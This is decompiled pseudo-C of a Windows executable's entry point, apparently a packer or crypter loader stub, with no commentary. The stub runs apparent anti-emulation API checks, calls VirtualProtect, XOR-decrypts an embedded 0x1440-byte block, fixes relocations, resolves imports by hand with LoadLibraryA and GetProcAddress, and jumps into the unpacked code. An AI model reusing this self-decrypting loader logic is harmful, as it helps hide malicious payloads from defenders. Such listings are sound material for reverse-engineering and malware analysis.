__size32 global17 = 0x25d1e6e1;// 4 bytes

// address: 0x401000
void _start(unsigned int param1) {
    unsigned char dl; 		// r10
    unsigned char dl_1; 		// r10{76}
    __size32 eax; 		// r24
    unsigned int eax_1; 		// r24{116}
    __size32 eax_2; 		// r24{139}
    unsigned int eax_3; 		// r24{357}
    unsigned int eax_4; 		// r24{184}
    unsigned int ebp; 		// r29
    void *ebp_1; 		// r29
    union { unsigned int x13; void * x14; } ebp_10; 		// r29{381}
    union { unsigned int x13; unsigned short * x14; } ebp_11; 		// r29{362}
    union { unsigned int x13; void * x14; } ebp_12; 		// r29{348}
    union { unsigned int x13; void * x14; } ebp_13; 		// r29{394}
    unsigned int ebp_2; 		// r29{108}
    unsigned int ebp_3; 		// r29{154}
    unsigned int ebp_4; 		// r29{156}
    union { unsigned int x13; unsigned short * x14; } ebp_5; 		// r29{199}
    union { unsigned int x13; unsigned short * x14; } ebp_6; 		// r29{236}
    unsigned int ebp_7; 		// r29{327}
    unsigned int ebp_8; 		// r29{306}
    unsigned int ebp_9; 		// r29{337}
    unsigned int ebx; 		// r27
    void **ebx_1; 		// r27
    unsigned int ebx_10; 		// r27{326}
    unsigned int ebx_11; 		// r27{313}
    unsigned int ebx_12; 		// r27{305}
    union { void ** x7; unsigned int x8; } ebx_13; 		// r27{360}
    unsigned int ebx_2; 		// r27{13}
    unsigned int ebx_3; 		// r27{51}
    unsigned int ebx_4; 		// r27{127}
    unsigned int ebx_5; 		// r27{151}
    unsigned int ebx_6; 		// r27{159}
    void **ebx_7; 		// r27{246}
    union { void ** x7; unsigned int x8; } ebx_8; 		// r27{238}
    unsigned int ebx_9; 		// r27{287}
    int ecx; 		// r25
    unsigned int ecx_2; 		// r25{290}
    __size32 edi; 		// r31
    __size32 edi_1; 		// r31{10}
    unsigned int edi_10; 		// r31{383}
    unsigned int edi_11; 		// r31{350}
    unsigned int edi_12; 		// r31{396}
    __size32 edi_2; 		// r31{74}
    __size32 edi_3; 		// r31{91}
    unsigned int edi_4; 		// r31{106}
    unsigned int edi_5; 		// r31{223}
    __size32 edi_6; 		// r31{297}
    __size32 edi_7; 		// r31{292}
    unsigned int edi_8; 		// r31{374}
    unsigned int edi_9; 		// r31{364}
    int edx; 		// r26
    void *edx_1; 		// r26
    __size32 *edx_2; 		// r26{335}
    __size32 *esi; 		// r30
    unsigned int esi_1; 		// r30
    int esp; 		// r28
    unsigned int local0; 		// m[esp - 52]
    __size32 *local1; 		// m[esp - 52]
    unsigned int local11; 		// m[esp - 48]
    __size32 *local19; 		// m[esp - 52]{427}
    unsigned int local2; 		// m[esp - 88]
    unsigned int local20; 		// m[esp - 88]{430}
    unsigned int local21; 		// ebx_9{287}
    __size32 local22; 		// edi_7{292}
    __size32 local23; 		// edi_6{297}
    unsigned int local24; 		// ebx_12{305}
    unsigned int local25; 		// ebp_8{306}
    unsigned int local26; 		// ebx_11{313}
    unsigned int local27; 		// ebx_10{326}
    unsigned int local28; 		// ebp_7{327}
    unsigned int local29; 		// ebp_9{337}
    union { unsigned int x13; void * x14; } local30; 		// ebp_12{348}
    unsigned int local31; 		// edi_11{350}
    unsigned int local32; 		// param1{416}
    union { void ** x7; unsigned int x8; } local33; 		// ebx_13{360}
    union { unsigned int x13; unsigned short * x14; } local34; 		// ebp_11{362}
    unsigned int local35; 		// edi_9{364}
    unsigned int local36; 		// edi_8{374}
    void **local37; 		// ebx_7{379}
    union { unsigned int x13; void * x14; } local38; 		// ebp_10{381}
    unsigned int local39; 		// edi_10{383}
    union { void * x25; unsigned int x26; } local4; 		// m[esp - 84]
    unsigned int local40; 		// local2{425}
    unsigned int local41; 		// eax_4{389}
    union { unsigned int x13; void * x14; } local42; 		// ebp_13{394}
    unsigned int local43; 		// edi_12{396}

    edi_1 = 0;
    ebx_2 = 32;
    eax = StrStrIA();
    local21 = ebx_2;
    local22 = edi_1;
    local32 = param1;
    if (eax != 0) {
    } else {
        eax = AddUsersToEncryptedFile();
        if (eax != 0) {
            eax = AreAllAccessesGranted();
            if (eax == 0) {
                ebx_3 = eax + 46;
                local21 = ebx_3;
            }
            ebx_9 = local21;
            eax = VirtualProtect(); /* Warning: also results in edx */
            local24 = ebx_9;
            ecx = 0;
            do {
                ecx_2 = ecx;
                edi_7 = local22;
                eax = ebx_9 + eax * 2;
                local23 = edi_7;
                if (edi_7 == ebx_9) {
                    edi_2 = 0;
                    local23 = edi_2;
                }
                edi_6 = local23;
                dl_1 = *(edi_6 + 0x404000);
                dl = (dl_1 ^ *(ecx_2 + 0x4015d8));
                *(char*)(ecx_2 + 0x4015d8) = dl ^ -96;
                edx = ecx_2 + (((edx >> 8 & 0xffffff | (dl_1)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl ^ -96)) * 8;
                ecx = ecx_2 + 1;
                edi_3 = edi_6 + 1;
                local22 = edi_3;
            } while (ecx_2 + 1 < 0x1440);
            edx_1 = 0x4028d8;
            ecx = ecx_2 + ebx_9 + 1;
            edi_4 = 0x401358;
            ebp_2 = 0;
            esi = 0xf0401358;
            local0 = 0;
            local25 = ebp_2;
            local29 = ebp_2;
            local31 = edi_4;
            local43 = edi_4;
            if ((unsigned int)(esp - 40) > 0) {
                do {
                    ebx_12 = local24;
                    ebp_8 = local25;
                    eax_1 = *(edx_1 + 4);
                    eax = (eax_1 - 8) / 2;
                    ecx = edx_1 + 8;
                    local27 = ebx_12;
                    local28 = ebp_8;
                    if ((int)((eax_1 - 8) / 2) > 0) {
                        ebx_4 = (eax_1 - 8) / 2;
                        local26 = ebx_4;
                        do {
                            ebx_11 = local26;
                            eax = *(unsigned short*)ecx;
                            if ((eax & 0xf000) == 0x3000) {
                                eax_2 = (eax & 0xfff) + *edx_1;
                                eax = eax_2 + 0x401358;
                                *(__size32*)(eax_2 + 0x401358) = *(eax_2 + 0x401358) - 0xfbfeca8;
                            }
                            ecx++;
                            ebx_5 = ebx_11 - 1;
                            local26 = ebx_5;
                            local27 = ebx_5;
                        } while (ebx_11 != 1);
                        ebp_3 = local0;
                        local28 = ebp_3;
                    }
                    ebx_10 = local27;
                    ebp_7 = local28;
                    ebp_4 = ebp_7 + *(edx_1 + 4);
                    local0 = ebp_4;
                    ebx_6 = ebx_10 - 0xfbfeca8;
                    edx_1 += *(edx_1 + 4);
                    local24 = ebx_6;
                    local25 = ebp_4;
                    local29 = ebp_4;
                } while (ebp_4 < (unsigned int)(esp - 40));
            }
            edx_2 = edx_1;
            ebp_9 = local29;
            ebx_1 = 0x4020c4;
            local1 = 0x4020c4;
            edx_1 = ecx + edx_2 * 2;
            dl = (unsigned char) ecx + edx_2 * 2;
            flags = SUBFLAGS32(*0x4020d4, 0, global17);
            local30 = ebp_9;
            local41 = eax;
            local42 = ebp_9;
            if (*0x4020d4 != 0) {
                ebx_1 = 0x4020c4;
                do {
                    ebx_13 = ebx_1;
                    ebp_12 = local30;
                    edi_11 = local31;
                    param1 = local32;
                    eax = *(ebx_13 + 12);
                    eax_4 = LoadLibraryA(eax + edi_11); /* Warning: also results in edx_1 */
                    local33 = ebx_13;
                    local35 = edi_11;
                    local37 = ebx_13;
                    local37 = ebx_13;
                    local38 = ebp_12;
                    local39 = edi_11;
                    local39 = edi_11;
                    local40 = param1;
                    local40 = param1;
                    esi = ebx_13 + esi * 8;
                    if (eax_4 != 0) {
                        ebp_1 = *ebx_13;
                        if (ebp_1 == 0) {
                            ebp_1 = *(ebx_13 + 16);
                        }
                        esi = *(ebx_13 + 16);
                        eax_4 = *(ebp_1 + edi_11);
                        ebp_5 = ebp_1 + edi_11;
                        esi += edi_11;
                        local34 = ebp_5;
                        local38 = ebp_5;
                        if (eax_4 != 0) {
L11:
                            eax_3 = eax_4;
                            ebx_13 = local33;
                            ebp_11 = local34;
                            edi_9 = local35;
                            local36 = edi_9;
                            if ((int)eax_3 >= 0) {
                                eax = GetProcAddress(eax_4, eax_3 + edi_9 + 2); /* Warning: also results in edx_1 */
                                goto L7;
                            }
                            edx = *(unsigned short*)ebp_11;
                            dl = (unsigned char) edx;
                            eax = GetProcAddress(eax_4, edx); /* Warning: also results in edx_1 */
                            edi_5 = 0x401358;
                            local36 = edi_5;
L7:
                            edi_8 = local36;
                            *(__size32*)esi = eax;
                            ebp_6 = ebp_11 + 4;
                            ebx_8 = ebx_13 * 9;
                            eax_4 = *(ebp_11 + 4);
                            esi++;
                            local33 = ebx_8;
                            local34 = ebp_6;
                            local35 = edi_8;
                            local38 = ebp_6;
                            local39 = edi_8;
                            local40 = local2;
                            if (eax_4 != 0) {
                                goto L11;
                            }
                            ebx_7 = local1;
                            local37 = ebx_7;
                        }
                    }
                    ebx_7 = local37;
                    ebp_10 = local38;
                    edi_10 = local39;
                    local2 = local40;
                    ebx_1 = ebx_7 + 20;
                    tmp1 = *(ebx_7 + 36);
                    flags = SUBFLAGS32(*(ebx_7 + 36), 0, tmp1);
                    local1 = ebx_7 + 20;
                    local30 = ebp_10;
                    local31 = edi_10;
                    local32 = local2;
                    local41 = eax_4;
                    local42 = ebp_10;
                    local43 = edi_10;
                } while (*(ebx_7 + 36) != 0);
            }
            eax_4 = local41;
            ebp_13 = local42;
            edi_12 = local43;
            (*0x401db8)(local20, local4, pc, ebp, 0x401000, 0x3000, 64, esp - 40, -1, local19, local11, 0x401358, 0x403028, 0, edi, esi_1, ebx, 232, dl, eax_4, 0x401db8, edx_1, ebx_1, ebp_13, esi, edi_12, flags, ZF, CF);
            *(__size32*)(esp - 4) = 0;
            ExitProcess(*(esp - 4));
        }
    }
    return;
}

